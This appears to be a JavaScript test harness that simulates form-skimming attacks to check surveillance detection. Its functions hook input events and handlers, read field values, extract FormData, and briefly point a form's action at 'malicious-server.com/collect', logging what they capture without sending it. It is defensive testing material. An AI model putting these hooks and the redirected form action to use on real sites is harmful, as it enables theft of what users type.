// Attack simulation functions for testing surveillance detection
console.log("🔍 DEBUG: attack-simulations.js loaded");

// 1. addEventListener Hook Simulation
function simulateAddEventListenerAttack() {
    logToConsole('addEventListener-console', 'Starting addEventListener surveillance simulation...', 'attack');

    const formElements = document.querySelectorAll('#addEventListener-form input, #addEventListener-form select, #addEventListener-form textarea');
    logToConsole('addEventListener-console', `Found ${formElements.length} form elements to attack`, 'info');

    formElements.forEach((element) => {
        const surveillanceEvents = ['input', 'keydown', 'change', 'focus', 'blur', 'keyup'];

        surveillanceEvents.forEach(eventType => {
            try {
                element.addEventListener(eventType, function(event) {
                    const elementInfo = {
                        type: element.type || element.tagName,
                        name: element.name,
                        value: element.value,
                        eventType: event.type
                    };

                    logToConsole('addEventListener-console',
                        `MALICIOUS: Captured ${eventType} on ${element.name || element.id}: "${element.value}"`,
                        'attack'
                    );

                    logToConsole('addEventListener-console',
                        `MALICIOUS: Would send data to attacker server: ${JSON.stringify(elementInfo)}`,
                        'attack'
                    );
                });

                logToConsole('addEventListener-console',
                    `Added ${eventType} listener to ${element.name || element.id}`,
                    'warn'
                );

            } catch (error) {
                logToConsole('addEventListener-console',
                    `Error adding ${eventType} listener: ${error.message}`,
                    'error'
                );
            }
        });
    });

    logToConsole('addEventListener-console', 'addEventListener surveillance simulation complete!', 'attack');
    logToConsole('addEventListener-console', 'Try typing in the form fields above to see the malicious listeners in action.', 'info');
}

// 2. Event Handler Hooks Simulation
function simulateEventHandlerAttack() {
    logToConsole('eventHandler-console', 'Starting event handler surveillance simulation...', 'attack');

    const formElements = document.querySelectorAll('#eventHandler-form input, #eventHandler-form select, #eventHandler-form textarea');
    logToConsole('eventHandler-console', `Found ${formElements.length} form elements to attack`, 'info');

    const eventHandlerProperties = ['oninput', 'onkeydown', 'onchange', 'onfocus', 'onblur', 'onkeyup'];

    formElements.forEach((element) => {
        eventHandlerProperties.forEach(handlerProp => {
            try {
                element[handlerProp] = function(event) {
                    const elementInfo = {
                        type: element.type || element.tagName,
                        name: element.name,
                        value: element.value,
                        eventType: event.type,
                        timestamp: new Date().toISOString()
                    };

                    logToConsole('eventHandler-console',
                        `MALICIOUS: Handler ${handlerProp} captured ${event.type} on ${element.name || element.id}: "${element.value}"`,
                        'attack'
                    );

                    if (element.value.length > 0) {
                        logToConsole('eventHandler-console',
                            `MALICIOUS: Sending sensitive data via ${handlerProp}: ${JSON.stringify(elementInfo)}`,
                            'attack'
                        );
                    }
                };

                logToConsole('eventHandler-console',
                    `Set ${handlerProp} handler on ${element.name || element.id}`,
                    'warn'
                );

            } catch (error) {
                logToConsole('eventHandler-console',
                    `Error setting ${handlerProp} handler: ${error.message}`,
                    'error'
                );
            }
        });
    });

    logToConsole('eventHandler-console', 'Event handler surveillance simulation complete!', 'attack');
    logToConsole('eventHandler-console', 'Try typing in the form fields above to see the malicious handlers in action.', 'info');
}

// 3. Property Getter Hooks Simulation
function simulatePropertyGetterAttack() {
    logToConsole('propertyGetter-console', 'Starting property getter surveillance simulation...', 'attack');

    const formElements = document.querySelectorAll('#propertyGetter-form input, #propertyGetter-form select, #propertyGetter-form textarea');
    logToConsole('propertyGetter-console', `Found ${formElements.length} form elements to attack`, 'info');

    const sensitiveProperties = ['value', 'nodeValue', 'textContent', 'innerText'];

    formElements.forEach((element) => {
        sensitiveProperties.forEach(propName => {
            try {
                let stolenValue;

                if (propName === 'value') {
                    stolenValue = element.value;
                } else if (propName === 'nodeValue') {
                    stolenValue = element.firstChild ? element.firstChild.nodeValue : null;
                } else if (propName === 'textContent') {
                    stolenValue = element.textContent;
                } else if (propName === 'innerText') {
                    stolenValue = element.innerText;
                }

                if (stolenValue !== null && stolenValue !== undefined && stolenValue !== '') {
                    const elementInfo = {
                        elementType: element.type || element.tagName,
                        elementName: element.name || element.id,
                        propertyAccessed: propName,
                        stolenValue: stolenValue,
                        timestamp: new Date().toISOString()
                    };

                    logToConsole('propertyGetter-console',
                        `MALICIOUS: Accessed ${propName} on ${element.name || element.id}: "${stolenValue}"`,
                        'attack'
                    );

                    logToConsole('propertyGetter-console',
                        `MALICIOUS: Exfiltrating data via ${propName}: ${JSON.stringify(elementInfo)}`,
                        'attack'
                    );
                }

                logToConsole('propertyGetter-console',
                    `Accessed ${propName} property on ${element.name || element.id}`,
                    'warn'
                );

            } catch (error) {
                logToConsole('propertyGetter-console',
                    `Error accessing ${propName} property: ${error.message}`,
                    'error'
                );
            }
        });
    });

    logToConsole('propertyGetter-console', 'Property getter surveillance simulation complete!', 'attack');
    logToConsole('propertyGetter-console', 'Values are being monitored. Try changing the form values above.', 'info');
}

// 4. Form Hooks Simulation - FormData Attack
function simulateFormHooksAttack() {
    logToConsole('formHooks-console', 'Starting FormData surveillance simulation...', 'attack');

    const form = document.getElementById('formHooks-form');
    if (!form) {
        logToConsole('formHooks-console', 'Error: Form not found!', 'error');
        return;
    }

    try {
        logToConsole('formHooks-console', 'Creating FormData object to steal form data...', 'attack');

        const formData = new FormData(form);

        logToConsole('formHooks-console', 'FormData created successfully. Extracting stolen data:', 'attack');

        const stolenData = {};
        formData.forEach((value, key) => {
            stolenData[key] = value;
            logToConsole('formHooks-console',
                `MALICIOUS: Extracted field "${key}": "${value}"`,
                'attack'
            );
        });

        const payloadData = {
            timestamp: new Date().toISOString(),
            formAction: form.action,
            formMethod: form.method,
            stolenFields: stolenData,
            victimUrl: window.location.href
        };

        logToConsole('formHooks-console',
            `MALICIOUS: Sending stolen form data to attacker server: ${JSON.stringify(payloadData)}`,
            'attack'
        );

    } catch (error) {
        logToConsole('formHooks-console', `Error in FormData attack: ${error.message}`, 'error');
    }

    logToConsole('formHooks-console', 'FormData surveillance simulation complete!', 'attack');
}

// Form Submit Attack
function simulateFormSubmitAttack() {
    logToConsole('formHooks-console', 'Starting form submission surveillance simulation...', 'attack');

    const form = document.getElementById('formHooks-form');
    if (!form) {
        logToConsole('formHooks-console', 'Error: Form not found!', 'error');
        return;
    }

    try {
        logToConsole('formHooks-console', 'Intercepting form before submission...', 'attack');

        const formData = new FormData(form);
        const interceptedData = {};
        formData.forEach((value, key) => {
            interceptedData[key] = value;
        });

        logToConsole('formHooks-console',
            `MALICIOUS: Intercepted form data before submission: ${JSON.stringify(interceptedData)}`,
            'attack'
        );

        const originalAction = form.action;
        form.action = 'https://malicious-server.com/collect';
        logToConsole('formHooks-console',
            `MALICIOUS: Changed form action from "${originalAction}" to "${form.action}"`,
            'attack'
        );

        // Restore original action for safety
        form.action = originalAction;
        logToConsole('formHooks-console', 'Submission prevented for testing. Form restored.', 'info');

    } catch (error) {
        logToConsole('formHooks-console', `Error in form submit attack: ${error.message}`, 'error');
    }

    logToConsole('formHooks-console', 'Form submission surveillance simulation complete!', 'attack');
}

// Submit Event Test
function simulateFormSubmissionEvent() {
    logToConsole('formHooks-console', 'Starting form submit event surveillance simulation...', 'attack');

    const form = document.getElementById('formHooks-form');
    if (!form) {
        logToConsole('formHooks-console', 'Error: Form not found!', 'error');
        return;
    }

    try {
        logToConsole('formHooks-console', 'Dispatching submit event on form...', 'attack');

        const submitEvent = new Event('submit', {
            bubbles: true,
            cancelable: true
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            logToConsole('formHooks-console', 'Submit event prevented for testing purposes', 'info');
        }, { once: true });

        const eventDispatched = form.dispatchEvent(submitEvent);

        logToConsole('formHooks-console',
            `Submit event dispatched: ${eventDispatched ? 'success' : 'cancelled'}`,
            'attack'
        );

        logToConsole('formHooks-console', 'Form submit event surveillance simulation complete!', 'attack');

    } catch (error) {
        logToConsole('formHooks-console', `Error in submit event simulation: ${error.message}`, 'error');
    }
}

// Make functions globally available
window.simulateAddEventListenerAttack = simulateAddEventListenerAttack;
window.simulateEventHandlerAttack = simulateEventHandlerAttack;
window.simulatePropertyGetterAttack = simulatePropertyGetterAttack;
window.simulateFormHooksAttack = simulateFormHooksAttack;
window.simulateFormSubmitAttack = simulateFormSubmitAttack;
window.simulateFormSubmissionEvent = simulateFormSubmissionEvent;